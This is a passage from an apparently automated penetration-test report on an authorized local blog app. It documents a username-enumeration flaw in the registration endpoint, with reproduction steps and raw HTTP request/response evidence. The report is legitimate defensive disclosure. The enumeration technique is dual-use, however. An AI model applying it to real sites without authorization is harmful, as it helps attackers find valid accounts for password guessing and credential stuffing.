                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/logout">Logout</a>
                    </li>
                
            </ul>
        </div>
    </nav>
    <div class="container">
        
            
        
        
    <h2>Create Draft</h2>
    <form method="POST" action="/create_draft">
        
        <div class="form-group">
            <label class="form-control-label" for="title">Title</label>
            <input class="form-control form-control-lg" id="title" maxlength="100" minlength="1" name="title" required type="text" value="">
        </div>
        <div class="form-group">
            <label class="form-control-label" for="content">Content</label>
            <textarea class="form-control form-control-lg" id="content" name="content" required>
</textarea>
        </div>
        <div class="form-group">
            <input class="btn btn-primary btn-lg btn-block" id="submit" name="submit" type="submit" value="Save Draft">
        </div>
    </form>

    </div>
</body>
</html>
```

<a id="finding-6"></a>

### 6. [LOW] [info-disclosure] Username enumeration via registration error message

- Screen: `s-0002`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:5003/

The POST /register endpoint discloses whether a username is already registered. Submitting an existing username (e.g. `test`, `admin`) returns HTTP 200 re-rendering the form with the distinct error "Username already exists. Please choose a different one." (alert-danger), while a free username returns HTTP 302 redirect to "/" with a "Registration successful!" flash. The two responses differ in status (200 vs 302) and body, giving an unauthenticated attacker a reliable oracle to enumerate valid account names (which can then be targeted by password-guessing/credential-stuffing — note the login error messages and the public /<username>/drafts route further confirm valid users). No rate limiting is present to slow such enumeration.

**Reproduction**

```
1. POST /register (no auth) with body username=admin&password=Passw0rd!23&confirm_password=Passw0rd!23&submit=Register → HTTP 200, body contains "Username already exists" (ev-mqzcq1wu-14); repeat with username=test → same marker (ev-mqzcoy4e-12).
2. Negative control: POST /register with a fresh username=enum_neg_01 (same other fields) → HTTP 302 redirect to "/", no "Username already exists" marker (ev-mqzcq0ll-13).
3. The distinct response for existing vs non-existing usernames lets an attacker enumerate valid accounts.
```

**Evidence**

- Evidence `ev-mqzcq0ll-13` — `artifacts/s-0002/ev-mqzcq0ll-13/`

Request:

```http
POST /register HTTP/1.1
Host: target.local:5003
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
authorization: <redacted>
content-type: application/x-www-form-urlencoded

username=enum_neg_01&password=Passw0rd!23&confirm_password=Passw0rd!23&submit=Register
```

Response:

```http
HTTP/1.1 302
connection: close
content-length: 189
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 15:07:16 GMT
location: /
server: Werkzeug/3.0.6 Python/3.8.17
set-cookie: <redacted>
vary: Cookie

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
```

- Evidence `ev-mqzcoy4e-12` — `artifacts/s-0002/ev-mqzcoy4e-12/`

Request:

```http
POST /register HTTP/1.1
Host: target.local:5003
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
authorization: <redacted>
content-type: application/x-www-form-urlencoded

username=test&password=Passw0rd!23&confirm_password=Passw0rd!23&submit=Register
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 2161
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 15:06:26 GMT
server: Werkzeug/3.0.6 Python/3.8.17
set-cookie: <redacted>
vary: Cookie

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Register</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-light bg-light">
        <a class="navbar-brand"  >Blog Raider</a>
        <div class="collapse navbar-collapse">
            <ul class="navbar-nav ml-auto">
                
                    <li class="nav-item">
                        <a class="nav-link" href="/register">Register</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/login">Login</a>
                    </li>
                
            </ul>
        </div>
    </nav>
    <div class="container">
        
            
                
                    <div class="alert alert-danger">Username already exists. Please choose a different one.</div>
                
            
        
        
    <h2>Register</h2>
    <form method="POST" action="/register">
        
        <div class="form-group">
            <label class="form-control-label" for="username">Username</label>
            <input class="form-control form-control-lg" id="username" maxlength="20" minlength="2" name="username" required type="text" value="test">
        </div>
        <div class="form-group">
            <label class="form-control-label" for="password">Password</label>
            <input class="form-control form-control-lg" id="password" name="password" required type="password" value="">
        </div>
        <div class="form-group">
            <label class="form-control-label" for="confirm_password">Confirm Password</label>
            <input class="form-control form-control-lg" id="confirm_password" name="confirm_password" required type="password" value="">
        </div>
        <div class="form-group">
            <input class="btn btn-primary btn-lg btn-block" id="submit" name="submit" type="submit" value="Sign Up">
        </div>
    </form>

    </div>
</body>
</html>
```

- Evidence `ev-mqzcq1wu-14` — `artifacts/s-0002/ev-mqzcq1wu-14/`

Request:

```http
POST /register HTTP/1.1
Host: target.local:5003
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
authorization: <redacted>
content-type: application/x-www-form-urlencoded

username=admin&password=Passw0rd!23&confirm_password=Passw0rd!23&submit=Register
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 2162
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 15:07:17 GMT
server: Werkzeug/3.0.6 Python/3.8.17
set-cookie: <redacted>
vary: Cookie

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Register</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-light bg-light">
        <a class="navbar-brand"  >Blog Raider</a>
        <div class="collapse navbar-collapse">
            <ul class="navbar-nav ml-auto">
                
                    <li class="nav-item">
                        <a class="nav-link" href="/register">Register</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/login">Login</a>
                    </li>
                
            </ul>
        </div>
    </nav>
    <div class="container">
        
            
                
                    <div class="alert alert-danger">Username already exists. Please choose a different one.</div>
                
            
        
        
    <h2>Register</h2>
    <form method="POST" action="/register">
        
        <div class="form-group">
            <label class="form-control-label" for="username">Username</label>
            <input class="form-control form-control-lg" id="username" maxlength="20" minlength="2" name="username" required type="text" value="admin">
        </div>
        <div class="form-group">
            <label class="form-control-label" for="password">Password</label>
            <input class="form-control form-control-lg" id="password" name="password" required type="password" value="">
        </div>
        <div class="form-group">
            <label class="form-control-label" for="confirm_password">Confirm Password</label>
            <input class="form-control form-control-lg" id="confirm_password" name="confirm_password" required type="password" value="">
        </div>
        <div class="form-group">
            <input class="btn btn-primary btn-lg btn-block" id="submit" name="submit" type="submit" value="Sign Up">
        </div>
    </form>

    </div>
</body>
</html>
```
